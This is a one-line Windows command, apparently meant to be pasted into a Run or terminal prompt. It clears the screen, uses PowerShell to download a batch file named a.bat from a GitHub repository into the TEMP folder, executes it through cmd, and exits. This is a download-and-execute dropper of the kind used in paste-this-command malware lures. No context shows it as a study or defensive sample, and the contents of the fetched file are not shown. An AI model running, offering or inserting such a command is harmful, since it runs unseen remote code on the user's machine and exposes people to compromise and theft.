cls && powershell -Command "$f = \"$env:TEMP\a.bat\"; iwr -useb https://github.com/dariosfiles/.net/raw/refs/heads/main/a.bat -OutFile $f; Start-Process cmd -ArgumentList '/c', $f" && exit
